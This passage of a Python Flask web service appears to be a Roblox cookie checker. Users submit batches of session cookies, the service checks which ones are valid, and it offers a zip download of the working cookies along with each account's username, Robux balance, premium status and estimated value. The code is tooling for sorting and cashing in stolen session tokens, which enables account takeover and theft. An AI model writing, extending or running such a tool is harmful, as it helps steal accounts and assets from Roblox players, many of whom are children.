        
        return results

def async_to_sync(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        return asyncio.run(f(*args, **kwargs))
    return wrapper

checker = AdvancedRobloxChecker()

@app.route('/')
def index():
    session_id = get_user_id()
    update_user_session(session_id)
    return render_template('index.html')

@app.route('/api/global_stats')
def api_global_stats():
    try:
        stats = get_global_stats()
        stats['active_users'] = get_active_users_count()
        return jsonify(stats)
    except Exception as e:
        return jsonify({'error': f'Stats error: {str(e)}'}), 500

@app.route('/api/history')
def api_history():
    try:
        user_id = get_user_id()
        update_user_session(user_id)
        history = get_user_history(user_id, 20)
        return jsonify(history)
    except Exception as e:
        return jsonify({'error': f'Database error: {str(e)}'}), 500

@app.route('/api/check', methods=['POST'])
@async_to_sync
async def api_check_cookies():
    try:
        user_id = get_user_id()
        update_user_session(user_id)
        
        data = request.get_json()
        if not data or 'cookies' not in data:
            return jsonify({'error': 'No cookies provided'}), 400
        
        cookies = data['cookies']
        if isinstance(cookies, str):
            cookies = [cookies]
        
        cookies = [c.strip() for c in cookies if c.strip()]
        
        if not cookies:
            return jsonify({'error': 'No valid cookies provided'}), 400
        
        if len(cookies) > 50:
            return jsonify({'error': 'Too many cookies. Maximum 50 per request.'}), 400
        
        results = await checker.check_multiple_cookies(cookies)
        
        session_id = datetime.now().strftime('%Y%m%d_%H%M%S_') + ''.join(random.choices('0123456789abcdef', k=8))
        valid_count = len([r for r in results if r.get('valid', False)])
        
        save_check_session(session_id, user_id, len(cookies), valid_count, results)
        
        return jsonify({
            'total': len(results),
            'valid': valid_count,
            'invalid': len(results) - valid_count,
            'results': results,
            'session_id': session_id,
            'checked_at': datetime.now().isoformat()
        })
    
    except Exception as e:
        return jsonify({'error': f'Server error: {str(e)}'}), 500

@app.route('/api/download/<session_id>')
def api_download_results(session_id):
    try:
        user_id = get_user_id()
        update_user_session(user_id)
        
        results = get_session_results(session_id, user_id)
        if not results:
            return jsonify({'error': 'Results not found'}), 404
        
        valid_cookies = [r for r in results if r.get('valid')]
        if not valid_cookies:
            return jsonify({'error': 'No valid cookies'}), 400
        
        zip_buffer = io.BytesIO()
        
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            cookies_content = "\n".join([r['cookie'] for r in valid_cookies])
            zip_file.writestr('valid_cookies.txt', cookies_content)
            
            detailed_report = {
                'check_date': datetime.now().isoformat(),
                'session_id': session_id,
                'summary': {
                    'total_checked': len(results),
                    'valid': len(valid_cookies),
                    'invalid': len([r for r in results if not r['valid']])
                },
                'valid_accounts': []
            }
            
            for result in valid_cookies:
                acc = result.get('account_info', {})
                detailed_report['valid_accounts'].append({
                    'username': acc.get('username', 'N/A'),
                    'user_id': acc.get('user_id', 'N/A'),
                    'robux': acc.get('total_robux', 0),
                    'premium': acc.get('premium', False),
                    'account_age': acc.get('account_age_days', 0),
                    'friends': acc.get('friends_count', 0),
                    'account_value': acc.get('account_value', 0),
                    'created_date': acc.get('formatted_date', 'Unknown')
                })
            
            zip_file.writestr('detailed_report.json', json.dumps(detailed_report, indent=2, ensure_ascii=False))
        
        zip_buffer.seek(0)
        filename = f'roblox_cookies_{session_id}.zip'
        
        return send_file(zip_buffer, as_attachment=True, download_name=filename, mimetype='application/zip')
        
    except Exception as e:
        return jsonify({'error': f'Archive error: {str(e)}'}), 500

@app.route('/api/session/<session_id>')
def api_get_session(session_id):
    try:
        user_id = get_user_id()
        update_user_session(user_id)
        
        results = get_session_results(session_id, user_id)
        if results:
            valid_count = len([r for r in results if r.get('valid', False)])
            return jsonify({
                'total': len(results),
                'valid': valid_count,
                'invalid': len(results) - valid_count,
                'results': results
            })
        return jsonify({'error': 'Session not found'}), 404
    except Exception as e:
        return jsonify({'error': f'Database error: {str(e)}'}), 500

@app.route('/api/delete/<session_id>', methods=['DELETE'])
def api_delete_session(session_id):
    try:
        user_id = get_user_id()
        update_user_session(user_id)
        
        conn = sqlite3.connect(app.config['DATABASE'])
        c = conn.cursor()
        c.execute('DELETE FROM check_history WHERE session_id = ? AND user_id = ?', (session_id, user_id))
        conn.commit()
        conn.close()
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': f'Delete failed: {str(e)}'}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)